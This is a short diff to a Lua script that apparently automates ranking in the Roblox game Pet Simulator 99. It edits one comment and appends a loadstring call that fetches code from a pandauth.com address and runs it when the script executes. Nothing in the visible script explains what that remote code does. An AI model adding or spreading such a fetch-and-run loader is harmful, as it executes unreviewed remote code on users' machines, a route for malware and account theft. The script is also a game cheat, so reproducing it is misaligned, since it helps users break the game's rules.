@@ -1,6 +1,6 @@
 -- [[ PS99 AUTO RANK - CONFIGURABLE SCRIPT ]] --
 
--- Default configuration if none is provided by the user
+-- Default configuration table
 getgenv().rankConfig = getgenv().rankConfig or {
     enabled = true,
     openGifts = true,
@@ -96,3 +96,6 @@ Status.TextSize = 12
 Status.Font = Enum.Font.Gotham
 Status.Text = "Status: Config Loaded Successfully"
 Status.Parent = MainFrame
+
+-- [[ YOUR LOADER SCRIPT AT THE BOTTOM ]] --
+loadstring(game:HttpGet("https://vss.pandauth.com/kv/65db32a22234c34c"))()
